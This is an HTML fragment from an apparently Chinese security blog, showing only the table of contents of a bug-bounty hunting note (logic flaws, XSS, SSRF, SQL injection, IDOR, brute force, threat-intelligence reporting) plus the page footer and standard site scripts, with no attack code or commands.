感受逻辑漏洞的”魅力”：并发</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%A0%B8%E5%BC%B9%E7%BA%A7%E2%80%94%E2%80%94%E5%B9%B6%E5%8F%91-RCE"><span class="toc-article-text">核弹级——并发 RCE</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BA%8C%E3%80%81JS-%E9%87%8C%E7%9A%84%E4%B8%9A%E5%8A%A1%E9%97%AE%E9%A2%98"><span class="toc-article-text">二、JS 里的业务问题</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-1-%E5%BC%80%E5%B1%80%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E6%A1%86%EF%BC%8C%E8%83%BD%E6%80%8E%E4%B9%88%E6%8C%96%EF%BC%9F"><span class="toc-article-text">2.1 开局一个登录框，能怎么挖？</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-2-%E4%B8%80%E4%B8%AA%E5%BE%88%E9%87%8D%E8%A6%81%E7%9A%84%E6%80%9D%E8%B7%AF%EF%BC%9A%E6%A0%B9%E6%8D%AE%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%BE%AA%E7%8E%AF%E9%80%BC%E8%BF%91"><span class="toc-article-text">2.2 一个很重要的思路：根据报错信息，循环逼近</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-3-%E5%85%B1%E6%80%A7%E6%80%9D%E7%BB%B4"><span class="toc-article-text">2.3 共性思维</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-4-JS-%E7%AA%81%E7%A0%B4-sign-%E5%AE%9A%E4%BD%8D"><span class="toc-article-text">2.4 JS 突破 sign 定位</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#2-5-%E5%8F%82%E6%95%B0%E7%88%86%E7%A0%B4"><span class="toc-article-text">2.5 参数爆破</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2-5-1-JSON-%E4%B8%AD%E7%9A%84%E9%94%AE%E5%90%8D%E4%B8%8E%E5%80%BC%E2%80%94%E2%80%94%E7%8C%9C%E6%B5%8B%E5%AE%83%E7%9A%84%E7%94%A8%E9%80%94"><span class="toc-article-text">2.5.1 JSON 中的键名与值——猜测它的用途</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2-5-2-%E7%AD%BE%E5%88%B0%E9%80%81%E4%BC%98%E6%83%A0%E5%88%B8%E3%80%81%E6%96%B0%E7%94%A8%E6%88%B7%E3%80%81%E5%BC%80%E5%AE%9D%E7%AE%B1"><span class="toc-article-text">2.5.2 签到送优惠券、新用户、开宝箱</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2-5-3-%E6%8A%BD%E5%A5%96%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E9%87%8D%E5%8F%91%E5%8C%85"><span class="toc-article-text">2.5.3 抽奖模式——重发包</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%89%E3%80%81OWASP-TOP-10"><span class="toc-article-text">三、OWASP TOP 10</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-1-XSS"><span class="toc-article-text">3.1 XSS</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-1-1-%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E2%80%94%E2%80%94%E9%87%8D%E7%81%BE%E5%8C%BA"><span class="toc-article-text">3.1.1 富文本编辑器——重灾区</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-1-2-%E8%A7%81%E6%A1%86%E5%B0%B1%E8%AF%95%EF%BC%8C%E8%A7%A6%E5%8F%91%E7%82%B9%E5%8F%AF%E8%83%BD%E5%9C%A8%E6%84%8F%E6%83%B3%E4%B8%8D%E5%88%B0%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-article-text">3.1.2 见框就试，触发点可能在意想不到的地方</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-1-3-%E4%BB%8E%E5%8E%9F%E7%90%86%E5%88%B0%E5%AE%9E%E8%B7%B5%E2%80%94%E2%80%94XSS-%E5%AE%B9%E6%98%93%E5%87%BA%E7%8E%B0%E7%9A%84%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-article-text">3.1.3 从原理到实践——XSS 容易出现的功能点</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-1-4-%E6%B5%8B%E8%AF%95%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E5%85%88%E6%8F%92%E6%97%A0%E5%AE%B3%E6%A0%87%E7%AD%BE%EF%BC%8C%E5%86%8D%E9%80%90%E6%AD%A5%E5%8A%A0%E7%A0%81"><span class="toc-article-text">3.1.4 测试技巧——先插无害标签，再逐步加码</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-1-5-%E8%BE%93%E5%85%A5%E5%AE%8C%E5%85%A8%E8%A2%AB%E8%BD%AC%E4%B9%89%E4%BA%86%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F%E8%AF%95%E8%AF%95%E5%85%B6%E4%BB%96%E7%AB%AF"><span class="toc-article-text">3.1.5 输入完全被转义了怎么办？试试其他端</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-1-6-%E4%B8%80%E4%B8%AA%E5%A5%87%E7%89%B9%E7%9A%84-APP-%E5%9C%BA%E6%99%AF%E2%80%94%E2%80%94%E6%8B%8D%E7%85%A7%E8%AF%86%E5%88%AB%E6%96%87%E5%AD%97"><span class="toc-article-text">3.1.6 一个奇特的 APP 场景——拍照识别文字</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-2-CORS"><span class="toc-article-text">3.2 CORS</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-3-SSRF"><span class="toc-article-text">3.3 SSRF</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-3-1-%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9A%E6%94%AF%E4%BB%98%E5%8A%9F%E8%83%BD%E7%82%B9%E9%87%8C%E8%97%8F%E7%9D%80-SSRF"><span class="toc-article-text">3.3.1 场景一：支付功能点里藏着 SSRF</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-3-2-%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9A%E6%84%8F%E8%A7%81%E5%8F%8D%E9%A6%88%E7%9A%84%E6%88%AA%E5%9B%BE%E5%8A%9F%E8%83%BD"><span class="toc-article-text">3.3.2 场景二：意见反馈的截图功能</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-3-3-SSRF-%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-article-text">3.3.3 SSRF 绕过技巧</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-4-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-article-text">3.4 SQL 注入</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-4-1-%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7"><span class="toc-article-text">3.4.1 延时注入技巧</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-4-2-%E9%AA%8C%E8%AF%81%E8%AF%AD%E5%8F%A5"><span class="toc-article-text">3.4.2 验证语句</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-4-3-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94exp-%E6%96%B9%E6%B3%95"><span class="toc-article-text">3.4.3 报错注入——exp() 方法</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-4-4-%E5%80%8D%E6%95%B0%E5%BB%B6%E8%BF%9F%E6%98%AF%E4%BB%80%E4%B9%88%E5%8E%9F%E5%9B%A0%EF%BC%9F"><span class="toc-article-text">3.4.4 倍数延迟是什么原因？</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-5-%E9%80%9A%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-article-text">3.5 通用思路</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#3-6-CSRF-%E6%8C%96%E6%8E%98"><span class="toc-article-text">3.6 CSRF 挖掘</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-6-1-%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E5%A4%B4%E5%83%8F%E5%9C%BA%E6%99%AF%E2%80%94%E2%80%94%E9%93%BE%E6%8E%A5%E5%8F%AF%E6%8E%A7%E5%90%97%EF%BC%9F"><span class="toc-article-text">3.6.1 案例一：头像场景——链接可控吗？</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-6-2-%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E5%BA%97%E9%93%BA-Token-%E5%8A%AB%E6%8C%81"><span class="toc-article-text">3.6.2 案例二：店铺 Token 劫持</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3-6-3-CSRF-%E5%B0%8F%E7%BB%93"><span class="toc-article-text">3.6.3 CSRF 小结</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%9B%9B%E3%80%81%E8%B6%8A%E6%9D%83"><span class="toc-article-text">四、越权</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-1-%E4%B8%89%E7%A7%8D%E7%B1%BB%E5%9E%8B"><span class="toc-article-text">4.1 三种类型</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-2-%E6%A0%B8%E5%BF%83%E2%80%94%E2%80%94%E5%AF%B9%E6%95%B0%E5%AD%97%E7%BB%9D%E5%AF%B9%E6%95%8F%E6%84%9F"><span class="toc-article-text">4.2 核心——对数字绝对敏感</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-3-%E5%90%84%E7%A7%8D%E5%9C%BA%E6%99%AF"><span class="toc-article-text">4.3 各种场景</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-4-%E4%B8%8D%E5%AE%89%E5%85%A8%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8%EF%BC%88IDOR%EF%BC%89"><span class="toc-article-text">4.4 不安全对象的直接调用（IDOR）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-4-1-%E6%A1%88%E4%BE%8B%EF%BC%9A%E4%BB%98%E8%B4%B9%E8%A7%86%E9%A2%91%E7%BB%95%E8%BF%87"><span class="toc-article-text">4.4.1 案例：付费视频绕过</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#4-4-2-%E5%85%8D%E8%B4%B9-%E4%BB%98%E8%B4%B9%E6%8E%A5%E5%8F%A3%E5%AF%B9%E6%AF%94%E6%B3%95"><span class="toc-article-text">4.4.2 免费&#x2F;付费接口对比法</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#4-5-UUID-%E5%9C%BA%E6%99%AF%E2%80%94%E2%80%94%E4%B8%8D%E5%8F%AF%E9%A2%84%E6%B5%8B%E7%9A%84-UUID-%E6%80%8E%E4%B9%88%E8%B6%8A%E6%9D%83%EF%BC%9F"><span class="toc-article-text">4.5 UUID 场景——不可预测的 UUID 怎么越权？</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BA%94%E3%80%81%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E6%8C%96%E6%8E%98"><span class="toc-article-text">五、威胁情报挖掘</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%9F"><span class="toc-article-text">5.1 什么是威胁情报？</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-2-SRC-%E5%AF%B9%E6%83%85%E6%8A%A5%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F"><span class="toc-article-text">5.2 SRC 对情报的处理方式</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-3-%E4%B8%8D%E5%90%8C%E5%8E%82%E5%95%86%E7%9C%8B%E9%87%8D%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-article-text">5.3 不同厂商看重什么？</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-4-%E6%9F%90%E5%8E%82%E5%95%86%E6%83%85%E6%8A%A5%E6%94%B6%E5%8F%96%E6%A0%87%E5%87%86%E7%A4%BA%E4%BE%8B"><span class="toc-article-text">5.4 某厂商情报收取标准示例</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-5-%E6%83%85%E6%8A%A5%E8%A6%81%E7%B4%A0%E2%80%94%E2%80%943W1H-%E8%BE%85%E5%8A%A9"><span class="toc-article-text">5.5 情报要素——3W1H + 辅助</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-6-%E6%80%8E%E4%B9%88%E6%8C%96%E6%8E%98%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%EF%BC%9F"><span class="toc-article-text">5.6 怎么挖掘威胁情报？</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-7-%E6%8F%90%E4%BA%A4%E6%A0%BC%E5%BC%8F%E7%A4%BA%E4%BE%8B"><span class="toc-article-text">5.7 提交格式示例</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#5-8-%E9%9A%90%E7%A7%81%E5%90%88%E8%A7%84"><span class="toc-article-text">5.8 隐私合规</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%AD%E3%80%81%E7%9B%B8%E5%85%B3%E6%A0%87%E5%87%86%E4%B8%8E%E5%B9%B3%E5%8F%B0%E7%B4%A2%E5%BC%95"><span class="toc-article-text">六、相关标准与平台索引</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6-1-%E9%98%BF%E9%87%8C%E5%B7%B4%E5%B7%B4%E9%9B%86%E5%9B%A2"><span class="toc-article-text">6.1 阿里巴巴集团</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6-2-%E5%9B%BD%E5%AE%B6-%E8%A1%8C%E4%B8%9A%E6%A0%B8%E5%BF%83%E6%A0%87%E5%87%86"><span class="toc-article-text">6.2 国家&#x2F;行业核心标准</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E7%BA%A7%E7%B1%BB"><span class="toc-article-text">漏洞管理与分级类</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AD%89%E7%BA%A7%E4%BF%9D%E6%8A%A4%E4%B8%8E%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B1%BB"><span class="toc-article-text">等级保护与安全管理类</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6-3-%E5%9B%BD%E9%99%85%E9%80%9A%E7%94%A8%E6%A0%87%E5%87%86%E4%B8%8E%E6%9D%83%E5%A8%81%E5%B9%B3%E5%8F%B0"><span class="toc-article-text">6.3 国际通用标准与权威平台</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6-4-%E5%9B%BD%E5%86%85%E6%9D%83%E5%A8%81%E6%BC%8F%E6%B4%9E%E5%85%B1%E4%BA%AB%E5%B9%B3%E5%8F%B0"><span class="toc-article-text">6.4 国内权威漏洞共享平台</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6-5-%E4%B8%BB%E6%B5%81%E5%8E%82%E5%95%86%E5%AE%89%E5%85%A8%E6%A0%87%E5%87%86%E4%B8%8E%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83"><span class="toc-article-text">6.5 主流厂商安全标准与响应中心</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9B%BD%E9%99%85%E5%8E%82%E5%95%86"><span class="toc-article-text">国际厂商</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%9B%BD%E5%86%85%E5%8E%82%E5%95%86"><span class="toc-article-text">国内厂商</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#6-6-%E4%B8%93%E9%A1%B9%E5%AE%89%E5%85%A8%E6%A0%87%E5%87%86%E4%B8%8E%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97"><span class="toc-article-text">6.6 专项安全标准与实践指南</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%83%E3%80%81API-%E5%AE%89%E5%85%A8%E4%B8%8E%E4%BA%91%E5%AE%89%E5%85%A8"><span class="toc-article-text">七、API 安全与云安全</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#7-1-OAuth-2-0"><span class="toc-article-text">7.1 OAuth 2.0</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#7-2-%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8%E2%80%94%E2%80%94AK-SK-%E6%B3%84%E9%9C%B2"><span class="toc-article-text">7.2 云安全入门——AK&#x2F;SK 泄露</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#7-2-1-%E6%B3%84%E9%9C%B2%E9%80%94%E5%BE%84"><span class="toc-article-text">7.2.1 泄露途径</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#7-2-2-%E6%A1%88%E4%BE%8B%EF%BC%9A%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1-Secret-%E6%B3%84%E9%9C%B2"><span class="toc-article-text">7.2.2 案例：企业微信 Secret 泄露</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#7-2-3-session-key-%E7%9A%84%E6%B3%84%E9%9C%B2"><span class="toc-article-text">7.2.3 session_key 的泄露</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%85%AB%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-article-text">八、暴力破解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#8-1-%E6%89%BE%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="toc-article-text">8.1 找测试环境</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#8-2-%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE"><span class="toc-article-text">8.2 用户名枚举</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#8-2-1-%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E9%87%91%E8%9E%8D%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91-%E5%B7%A5%E5%8F%B7%E7%88%86%E7%A0%B4"><span class="toc-article-text">8.2.1 案例一：金融后台系统的签名逆向 + 工号爆破</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#8-2-2-%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9A%E4%B8%80%E7%AB%99%E5%BC%8F%E6%9C%8D%E5%8A%A1%E5%A4%A7%E5%8E%85%E2%80%94%E2%80%94%E8%BA%AB%E4%BB%BD%E8%AF%81%E7%88%86%E7%A0%B4"><span class="toc-article-text">8.2.2 案例二：一站式服务大厅——身份证爆破</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B9%9D%E3%80%81%E6%8A%80%E8%83%BD%E7%89%B9%E8%AE%AD%E2%80%94%E2%80%94%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E6%B7%B1%E5%BA%A6%E6%8B%86%E8%A7%A3"><span class="toc-article-text">九、技能特训——实战案例深度拆解</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#9-1-%E6%A1%88%E4%BE%8B%E4%B8%80%EF%BC%9A%E6%B8%B8%E6%88%8F%E4%B8%AD%E5%BF%83%E5%AE%A2%E6%9C%8D%E2%80%94%E2%80%94%E4%BB%8E-XSS-%E5%88%B0-Getshell"><span class="toc-article-text">9.1 案例一：游戏中心客服——从 XSS 到 Getshell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#9-2-%E6%A1%88%E4%BE%8B%E4%BA%8C%EF%BC%9ADirsearch-%E8%B7%91%E5%87%BA%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-article-text">9.2 案例二：Dirsearch 跑出敏感目录</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%8D%81%E3%80%81%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%E4%B8%8E%E8%B5%84%E4%BA%A7%E6%A2%B3%E7%90%86"><span class="toc-article-text">十、准备工作与资产梳理</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-article-text">10.1 环境配置</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-2-%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86%E6%B5%81%E7%A8%8B"><span class="toc-article-text">10.2 资产收集流程</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-3-%E6%80%9D%E8%B7%AF%E6%89%93%E5%BC%80%E2%80%94%E2%80%94%E8%A7%92%E8%89%B2%E5%88%87%E6%8D%A2%E6%B3%95"><span class="toc-article-text">10.3 思路打开——角色切换法</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-4-%E8%BF%94%E5%9B%9E%E5%8C%85%E4%B9%9F%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%94%B9%E7%9A%84"><span class="toc-article-text">10.4 返回包也是可以改的</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-5-%E4%B8%80%E4%B8%AA%E5%B0%8F%E4%BC%97%E5%8A%9F%E8%83%BD%E7%82%B9%E7%9A%84-cookie-%E7%88%86%E7%A0%B4-%E2%86%92-%E5%85%A8%E7%AB%99%E6%8E%A5%E7%AE%A1"><span class="toc-article-text">10.5 一个小众功能点的 cookie 爆破 → 全站接管</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-6-%E4%BB%98%E8%B4%B9%E5%86%85%E5%AE%B9%E2%80%94%E2%80%94%E7%9C%8B%E5%AE%8C%E5%85%8D%E8%B4%B9%E9%83%A8%E5%88%86%E5%B0%B1%E6%9C%89%E7%BA%BF%E7%B4%A2%E4%BA%86"><span class="toc-article-text">10.6 付费内容——看完免费部分就有线索了</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#10-7-%E4%BC%81%E4%B8%9A%E8%B4%A6%E5%8F%B7%E6%B3%A8%E5%86%8C%E2%80%94%E2%80%94%E6%B2%A1%E6%9C%89%E8%90%A5%E4%B8%9A%E6%89%A7%E7%85%A7%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-article-text">10.7 企业账号注册——没有营业执照怎么办？</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E9%99%84%EF%BC%9A%E8%BF%99%E7%AF%87%E7%AC%94%E8%AE%B0%E8%83%8C%E5%90%8E%E7%9A%84%E2%80%9D%E5%85%83%E6%80%9D%E7%BB%B4%E2%80%9D"><span class="toc-article-text">附：这篇笔记背后的”元思维”</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%80%9D%E7%BB%B4%E4%B8%80%EF%BC%9A%E6%97%A0%E5%81%87%E8%AE%BE%E6%B5%8B%E8%AF%95%EF%BC%88Assume-Nothing%EF%BC%89"><span class="toc-article-text">思维一：无假设测试（Assume Nothing）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%80%9D%E7%BB%B4%E4%BA%8C%EF%BC%9A%E4%BF%A1%E5%8F%B7%E8%AF%86%E5%88%AB%EF%BC%88Signal-Recognition%EF%BC%89"><span class="toc-article-text">思维二：信号识别（Signal Recognition）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%80%9D%E7%BB%B4%E4%B8%89%EF%BC%9A%E6%89%A9%E5%A4%A7%E5%BD%B1%E5%93%8D%EF%BC%88Amplify%EF%BC%89"><span class="toc-article-text">思维三：扩大影响（Amplify）</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%80%9D%E7%BB%B4%E5%9B%9B%EF%BC%9A%E6%88%90%E6%9C%AC%E4%B8%8D%E5%AF%B9%E7%A7%B0%EF%BC%88Cost-Asymmetry%EF%BC%89"><span class="toc-article-text">思维四：成本不对称（Cost Asymmetry）</span></a></li></ol></li></ol>
+			</div>
+		
+		</div>
+	</div>
+
+</div><!-- col-md-3 -->
+
+
+		</div>
+
+		
+
+	</div><!-- row -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 ZQ-Rookie-Hacker's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/toc.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
